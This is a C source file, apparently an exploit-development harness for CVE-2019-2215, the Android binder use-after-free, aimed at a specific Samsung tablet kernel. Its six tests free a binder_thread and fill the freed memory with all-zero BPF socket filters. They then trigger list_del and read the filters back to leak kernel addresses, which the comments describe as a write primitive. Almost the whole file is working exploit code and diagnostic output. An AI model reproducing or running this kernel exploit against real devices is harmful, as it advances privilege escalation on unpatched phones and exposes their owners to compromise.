/*
 * cve_2019_2215_zero.c — CVE-2019-2215 with ZERO-BYTE BPF spray
 *
 * KEY INSIGHT: Previous multi-epoll test found 0 corruptions because
 * the spinlock at binder_thread->wait.lock was non-zero (BPF instruction
 * bytes 0x0020...), causing spin_lock to hang forever.
 *
 * FIX: Use BPF_LD_IMM (code=0x0000) for all instructions. This creates
 * all-zero BPF filter data, so the spinlock reads as 0 (unlocked).
 * Then list_del actually executes and writes kernel addresses into BPF data.
 *
 * DETECTION: Use SO_GET_FILTER to read back BPF instructions after
 * close(epfd1). Any non-zero bytes in the all-zero BPF data = kernel address leak.
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o cve_2019_2215_zero cve_2019_2215_zero.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)

#define NUM_SPRAY 200
#define BPF_INSNS 26   /* 26 insns × 8 bytes = 208 bytes → kmalloc-256 */
#define SO_GET_FILTER 26

/* sk_filter layout:
 * [0]  atomic_t refcnt       (4 bytes)
 * [4]  unsigned int len      (4 bytes) — number of BPF instructions
 * [8]  struct rcu_head rcu   (8 bytes on ARM32: 2 pointers)
 * [16] bpf_func_t bpf_func  (4 bytes)
 * [20] struct sock_filter insns[] — BPF instructions start here
 *
 * Each sock_filter: code(u16) + jt(u8) + jf(u8) + k(u32) = 8 bytes
 *
 * binder_thread->wait is at offset ~44 in binder_thread.
 * At offset 44 in the k256 allocation (if spray reclaims):
 *   offset 44 = BPF insn[(44-20)/8] = insn[3], byte offset (44-20)%8 = 0
 *   So lock = first 4 bytes of insn[3]
 *   task_list.next = next 4 bytes of insn[3]
 *   task_list.prev = first 4 bytes of insn[4]
 */

static struct sock_filter zero_insns[BPF_INSNS];
static struct sock_filter orig_copy[BPF_INSNS];

static void init_zero_bpf(void) {
    /* All instructions = BPF_LD_IMM with k=0 → code=0x0000, jt=0, jf=0, k=0x00000000
     * This is 8 bytes of zeros per instruction = entire BPF data is zero */
    for (int i = 0; i < BPF_INSNS - 1; i++) {
        zero_insns[i] = (struct sock_filter){ 0x0000, 0, 0, 0x00000000 };
    }
    /* Last instruction MUST be BPF_RET or kernel rejects */
    zero_insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
    memcpy(orig_copy, zero_insns, sizeof(zero_insns));
}

/* ========== TEST 1: Zero-byte BPF spray + SO_GET_FILTER readback ========== */

static void test_zero_bpf_readback(void) {
    printf("=== TEST 1: Zero-byte BPF spray + readback ===\n");
    printf("  All BPF insns = 0x0000 (BPF_LD_IMM k=0)\n");
    printf("  Spinlock at any offset reads as 0 (unlocked)\n\n");

    init_zero_bpf();
    int total_corrupted_trials = 0;

    for (int trial = 0; trial < 20; trial++) {
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) { printf("  binder open failed\n"); return; }
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
        uint32_t z = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

        /* 2 epolls → 2 eppoll_entries in binder_thread->wait */
        int epfd1 = epoll_create1(0);
        int epfd2 = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);
        epoll_ctl(epfd2, EPOLL_CTL_ADD, bfd, &ev);

        /* FREE binder_thread (UAF) */
        int32_t dummy = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

        /* SPRAY with zero-byte BPF filters */
        int spray_socks[NUM_SPRAY];
        struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
        int sprayed = 0;
        for (int i = 0; i < NUM_SPRAY; i++) {
            spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (spray_socks[i] < 0) break;
            if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog)) == 0)
                sprayed++;
            else { close(spray_socks[i]); break; }
        }

        /* TRIGGER: close(epfd1)
         * ep_unregister_pollwait → remove_wait_queue(whead, &eppoll_entry1->wait)
         * whead points to freed/sprayed memory (BPF data)
         * spin_lock(&whead->lock) → lock is 0 (BPF bytes are 0) → succeeds!
         * list_del(&eppoll_entry1->wait.task_list):
         *   Writes eppoll_entry2 address into BPF data at offset W+4
         *   Writes BPF data addr into eppoll_entry2 */
        close(epfd1);

        /* READBACK: scan all BPF filters for non-zero bytes (kernel addresses!) */
        int this_trial_corrupted = 0;
        for (int i = 0; i < sprayed; i++) {
            struct sock_filter readback[BPF_INSNS];
            socklen_t optlen = sizeof(readback);
            if (getsockopt(spray_socks[i], SOL_SOCKET, SO_GET_FILTER,
                          readback, &optlen) < 0)
                continue;

            /* Check all instructions EXCEPT the last (BPF_RET is known non-zero) */
            for (int j = 0; j < BPF_INSNS - 1; j++) {
                if (readback[j].code != 0 || readback[j].jt != 0 ||
                    readback[j].jf != 0 || readback[j].k != 0) {
                    /* NON-ZERO in an all-zero filter → KERNEL WROTE HERE */
                    if (!this_trial_corrupted) {
                        printf("  [trial %d] CORRUPTION in sock %d, insn %d (byte off %d):\n",
                               trial, i, j, 20 + j * 8);
                    }
                    uint32_t *raw = (uint32_t *)&readback[j];
                    printf("    insn[%d]: raw=%08x_%08x", j, raw[0], raw[1]);
                    if ((raw[0] & 0xC0000000) == 0xC0000000)
                        printf(" → KERNEL ADDR 0x%08x!", raw[0]);
                    if ((raw[1] & 0xC0000000) == 0xC0000000)
                        printf(" → KERNEL ADDR 0x%08x!", raw[1]);
                    printf("\n");
                    this_trial_corrupted++;
                }
            }
        }

        if (this_trial_corrupted > 0) {
            printf("    → %d corrupted instructions total\n", this_trial_corrupted);
            total_corrupted_trials++;
        }

        /* Cleanup */
        close(epfd2);
        for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
        close(bfd);
    }

    printf("\n  Result: %d/20 trials had BPF corruption\n\n", total_corrupted_trials);
    if (total_corrupted_trials > 0) {
        printf("  *** KERNEL ADDRESS LEAK CONFIRMED! ***\n");
        printf("  *** This is a write primitive — list_del writes controlled values ***\n\n");
    }
}

/* ========== TEST 2: Identify exact wait_queue offset via pattern spray ========== */

static void test_offset_identification(void) {
    printf("=== TEST 2: Identify wait_queue_head offset ===\n");
    printf("  Use sequential patterns to find corruption offset\n\n");

    /* Create BPF with sequential markers so we can identify WHICH bytes changed */
    struct sock_filter marker_insns[BPF_INSNS];
    for (int i = 0; i < BPF_INSNS - 1; i++) {
        /* Each insn: code=marker, jt=0, jf=0, k=marker
         * Use tiny non-zero values that won't look like kernel addrs or locks */
        marker_insns[i] = (struct sock_filter){
            .code = 0,  /* BPF_LD_IMM — keep code zero for lock compatibility */
            .jt = 0, .jf = 0,
            .k = (uint32_t)(i + 1)  /* k = 1,2,3,...25 */
        };
    }
    marker_insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };

    for (int trial = 0; trial < 10; trial++) {
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) return;
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
        uint32_t z = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

        int epfd1 = epoll_create1(0);
        int epfd2 = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);
        epoll_ctl(epfd2, EPOLL_CTL_ADD, bfd, &ev);

        int32_t dummy = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

        /* Spray */
        int spray_socks[NUM_SPRAY];
        struct sock_fprog prog = { .len = BPF_INSNS, .filter = marker_insns };
        int sprayed = 0;
        for (int i = 0; i < NUM_SPRAY; i++) {
            spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (spray_socks[i] < 0) break;
            if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog)) == 0)
                sprayed++;
            else { close(spray_socks[i]); break; }
        }

        close(epfd1);

        /* Readback */
        for (int i = 0; i < sprayed; i++) {
            struct sock_filter readback[BPF_INSNS];
            socklen_t optlen = sizeof(readback);
            if (getsockopt(spray_socks[i], SOL_SOCKET, SO_GET_FILTER,
                          readback, &optlen) < 0)
                continue;

            for (int j = 0; j < BPF_INSNS - 1; j++) {
                uint32_t expected_k = (uint32_t)(j + 1);
                if (readback[j].code != marker_insns[j].code ||
                    readback[j].k != expected_k) {
                    printf("  [trial %d sock %d] insn[%d] (alloc+%d): "
                           "code 0x%04x→0x%04x k 0x%08x→0x%08x\n",
                           trial, i, j, 20 + j * 8,
                           marker_insns[j].code, readback[j].code,
                           expected_k, readback[j].k);

                    /* Determine: is this the lock, next, or prev? */
                    int byte_off = 20 + j * 8;
                    printf("    Byte offset %d in allocation → ", byte_off);
                    uint32_t val;
                    memcpy(&val, &readback[j], 4);
                    if (val == 0 || val == 1) {
                        printf("likely spinlock (value=%u)\n", val);
                    } else if ((val & 0xC0000000) == 0xC0000000) {
                        printf("KERNEL ADDRESS 0x%08x → likely list ptr\n", val);
                    } else {
                        printf("unknown value 0x%08x\n", val);
                    }
                }
            }
        }

        close(epfd2);
        for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
        close(bfd);
    }
    printf("\n");
}

/* ========== TEST 3: 3-epoll amplified write detection ========== */

static void test_three_epoll(void) {
    printf("=== TEST 3: 3-epoll amplified write ===\n");
    printf("  3 eppoll entries → list_del with guaranteed cross-writes\n\n");

    init_zero_bpf();
    int total_corrupted_trials = 0;

    for (int trial = 0; trial < 10; trial++) {
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) return;
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
        uint32_t z = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

        /* 3 epolls for stronger signal */
        int epfd1 = epoll_create1(0);
        int epfd2 = epoll_create1(0);
        int epfd3 = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);
        epoll_ctl(epfd2, EPOLL_CTL_ADD, bfd, &ev);
        epoll_ctl(epfd3, EPOLL_CTL_ADD, bfd, &ev);

        int32_t dummy = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

        /* Spray */
        int spray_socks[NUM_SPRAY];
        struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
        int sprayed = 0;
        for (int i = 0; i < NUM_SPRAY; i++) {
            spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (spray_socks[i] < 0) break;
            if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog)) == 0)
                sprayed++;
            else { close(spray_socks[i]); break; }
        }

        /* Close epfd1 — should write entry2/entry3 addrs into BPF data */
        close(epfd1);

        /* Readback before closing epfd2 */
        int corrupted = 0;
        for (int i = 0; i < sprayed; i++) {
            struct sock_filter readback[BPF_INSNS];
            socklen_t optlen = sizeof(readback);
            if (getsockopt(spray_socks[i], SOL_SOCKET, SO_GET_FILTER,
                          readback, &optlen) < 0)
                continue;

            for (int j = 0; j < BPF_INSNS - 1; j++) {
                uint32_t *raw = (uint32_t *)&readback[j];
                if (raw[0] != 0 || raw[1] != 0) {
                    printf("  [trial %d] sock %d insn[%d] (off %d): "
                           "%08x_%08x",
                           trial, i, j, 20 + j * 8, raw[0], raw[1]);
                    if ((raw[0] >= 0xC0000000 && raw[0] < 0xF0000000) ||
                        (raw[1] >= 0xC0000000 && raw[1] < 0xF0000000))
                        printf(" ← KERNEL ADDRESS!");
                    printf("\n");
                    corrupted++;
                }
            }
        }
        if (corrupted) total_corrupted_trials++;

        /* Close remaining epolls */
        close(epfd2);
        close(epfd3);
        for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
        close(bfd);
    }

    printf("  Result: %d/10 trials had corruption\n\n", total_corrupted_trials);
}

/* ========== TEST 4: Verify BPF_LD_IMM works & readback identity ========== */

static void test_bpf_identity(void) {
    printf("=== TEST 4: BPF zero-filter identity check ===\n");

    init_zero_bpf();
    struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };

    int sk = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk < 0) { printf("  socket failed\n\n"); return; }

    int rc = setsockopt(sk, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
    printf("  SO_ATTACH_FILTER (zero BPF): rc=%d (%s)\n", rc,
           rc < 0 ? strerror(errno) : "OK");

    if (rc == 0) {
        struct sock_filter readback[BPF_INSNS];
        socklen_t optlen = sizeof(readback);
        rc = getsockopt(sk, SOL_SOCKET, SO_GET_FILTER, readback, &optlen);
        printf("  SO_GET_FILTER: rc=%d optlen=%d\n", rc, (int)optlen);

        if (rc == 0) {
            int diffs = 0;
            for (int j = 0; j < BPF_INSNS; j++) {
                if (memcmp(&readback[j], &zero_insns[j], sizeof(struct sock_filter)) != 0) {
                    printf("  DIFF at insn[%d]: wrote %04x/%02x/%02x/%08x "
                           "read %04x/%02x/%02x/%08x\n", j,
                           zero_insns[j].code, zero_insns[j].jt,
                           zero_insns[j].jf, zero_insns[j].k,
                           readback[j].code, readback[j].jt,
                           readback[j].jf, readback[j].k);
                    diffs++;
                }
            }
            if (diffs == 0)
                printf("  PERFECT MATCH — readback is identical to written\n");
            else
                printf("  %d differences — kernel transforms instructions!\n", diffs);
        }
    }

    close(sk);
    printf("\n");
}

/* ========== TEST 5: Single epoll baseline (should be self-referential) ========== */

static void test_single_epoll_baseline(void) {
    printf("=== TEST 5: Single epoll baseline (expect no corruption) ===\n");

    init_zero_bpf();

    for (int trial = 0; trial < 5; trial++) {
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) return;
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
        uint32_t z = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

        /* Only 1 epoll (self-referential list_del) */
        int epfd1 = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);

        int32_t dummy = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

        int spray_socks[NUM_SPRAY];
        struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
        int sprayed = 0;
        for (int i = 0; i < NUM_SPRAY; i++) {
            spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (spray_socks[i] < 0) break;
            if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog)) == 0)
                sprayed++;
            else { close(spray_socks[i]); break; }
        }

        close(epfd1);

        int corrupted = 0;
        for (int i = 0; i < sprayed; i++) {
            struct sock_filter readback[BPF_INSNS];
            socklen_t optlen = sizeof(readback);
            if (getsockopt(spray_socks[i], SOL_SOCKET, SO_GET_FILTER,
                          readback, &optlen) < 0)
                continue;
            for (int j = 0; j < BPF_INSNS - 1; j++) {
                uint32_t *raw = (uint32_t *)&readback[j];
                if (raw[0] != 0 || raw[1] != 0) {
                    printf("  [trial %d] UNEXPECTED: sock %d insn[%d]: %08x_%08x\n",
                           trial, i, j, raw[0], raw[1]);
                    corrupted++;
                }
            }
        }
        if (corrupted == 0)
            printf("  [trial %d] Clean (no corruption, as expected for 1 epoll)\n", trial);

        for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
        close(bfd);
    }
    printf("\n");
}

/* ========== TEST 6: Direct wait_queue_head read via /proc/self/mem ========== */

static void test_proc_mem_read(void) {
    printf("=== TEST 6: /proc/self/mem + BPF spray forensics ===\n");
    printf("  After spray, read BPF data via /proc/self/mem to check corruption\n\n");

    /* Alternative approach: instead of SO_GET_FILTER, use /proc/self/mem
     * to read the raw kernel memory of BPF filters... but we can't read
     * kernel memory from /proc/self/mem (only user space).
     * However, we CAN detect corruption via recv behavior. */

    init_zero_bpf();

    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) return;
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
    uint32_t z = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

    int epfd1 = epoll_create1(0);
    int epfd2 = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);
    epoll_ctl(epfd2, EPOLL_CTL_ADD, bfd, &ev);

    int32_t dummy = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

    /* Use UNIX dgram pairs for spray — we can send test packets */
    int spray_pairs[NUM_SPRAY][2];
    struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
    int sprayed = 0;

    for (int i = 0; i < NUM_SPRAY; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_pairs[i]) < 0)
            break;
        if (setsockopt(spray_pairs[i][1], SOL_SOCKET, SO_ATTACH_FILTER,
                      &prog, sizeof(prog)) < 0) {
            close(spray_pairs[i][0]);
            close(spray_pairs[i][1]);
            break;
        }
        sprayed++;
    }
    printf("  Sprayed %d UNIX dgram pairs\n", sprayed);

    /* Before trigger: verify all filters work (send packet, expect to receive) */
    int pre_working = 0;
    for (int i = 0; i < sprayed && i < 50; i++) {
        char pkt[] = "TEST";
        send(spray_pairs[i][0], pkt, 4, MSG_DONTWAIT);
        char buf[16];
        int n = recv(spray_pairs[i][1], buf, sizeof(buf), MSG_DONTWAIT);
        if (n == 4) pre_working++;
    }
    printf("  Pre-trigger: %d/50 filters pass packets\n", pre_working);

    /* TRIGGER */
    close(epfd1);

    /* After trigger: test if any filter broke */
    int post_working = 0;
    int post_broken = 0;
    for (int i = 0; i < sprayed && i < 50; i++) {
        char pkt[] = "TEST";
        send(spray_pairs[i][0], pkt, 4, MSG_DONTWAIT);
        char buf[16];
        int n = recv(spray_pairs[i][1], buf, sizeof(buf), MSG_DONTWAIT);
        if (n == 4) post_working++;
        else post_broken++;
    }
    printf("  Post-trigger: %d/50 working, %d/50 broken\n", post_working, post_broken);

    if (post_broken > 0) {
        printf("  *** BPF FILTER CORRUPTED BY LIST_DEL WRITE! ***\n");
    }

    /* Also check via SO_GET_FILTER */
    int so_get_corrupted = 0;
    for (int i = 0; i < sprayed; i++) {
        struct sock_filter readback[BPF_INSNS];
        socklen_t optlen = sizeof(readback);
        if (getsockopt(spray_pairs[i][1], SOL_SOCKET, SO_GET_FILTER,
                      readback, &optlen) < 0)
            continue;
        for (int j = 0; j < BPF_INSNS - 1; j++) {
            uint32_t *raw = (uint32_t *)&readback[j];
            if (raw[0] != 0 || raw[1] != 0) {
                printf("  SO_GET_FILTER: pair %d insn[%d] (off %d): %08x_%08x\n",
                       i, j, 20 + j * 8, raw[0], raw[1]);
                so_get_corrupted++;
            }
        }
    }
    printf("  SO_GET_FILTER corruptions: %d\n", so_get_corrupted);

    close(epfd2);
    for (int i = 0; i < sprayed; i++) {
        close(spray_pairs[i][0]);
        close(spray_pairs[i][1]);
    }
    close(bfd);
    printf("\n");
}

int main(void) {
    printf("=== CVE-2019-2215 Zero-Byte BPF Exploit ===\n");
    printf("SM-T377A kernel 3.10.9, patch 2017-07\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    alarm(300);

    /* First verify BPF identity works */
    test_bpf_identity();

    /* Single epoll baseline (should show no corruption) */
    test_single_epoll_baseline();

    /* Multi-epoll with zero-byte BPF — THE MAIN TEST */
    test_zero_bpf_readback();

    /* 3-epoll amplified */
    test_three_epoll();

    /* Pattern-based offset identification */
    test_offset_identification();

    /* Recv-based detection */
    test_proc_mem_read();

    printf("--- dmesg ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -20 | grep -iE "
           "'oops|bug|panic|fault|corrupt|Backtrace|Unable|PC.is|"
           "binder|epoll|WARNING|list_del|use.after' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
